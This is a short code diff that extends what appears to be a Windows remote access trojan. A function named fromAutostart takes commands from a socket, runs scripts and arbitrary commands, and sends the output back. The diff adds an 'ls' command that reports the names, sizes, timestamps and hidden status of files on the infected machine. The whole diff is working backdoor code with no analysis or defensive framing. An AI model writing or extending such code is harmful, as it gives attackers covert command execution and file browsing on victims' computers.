@@ -133,8 +133,21 @@ def fromAutostart():
                                 stdoutput = "Error opening directory.\n"
                         elif data.startswith(("Activate")):
                             stdoutput = ''
-                        elif data.startswith("runscript"):
+                        elif data.startswith("runscript "):
                             stdoutput = Execute(data[10:])
+                        elif data.startswith("ls"):
+                            string = {}
+                            try:
+                                for n, i in enumerate(os.listdir(u'.')):
+                                    string[n] = {}
+                                    string[n]['name'] = i
+                                    string[n]['type'] = os.path.isfile(i)
+                                    string[n]['size'] = os.path.getsize(i)
+                                    string[n]['modified'] = time.ctime(os.path.getmtime(i))
+                                    string[n]['hidden'] = has_hidden_attribute(i)
+                                stdoutput = str(string)
+                            except WindowsError:
+                                stdoutput = 'Access is denied'
                         else:
                             stdoutput = Exec(data)
                         Send(s, stdoutput)
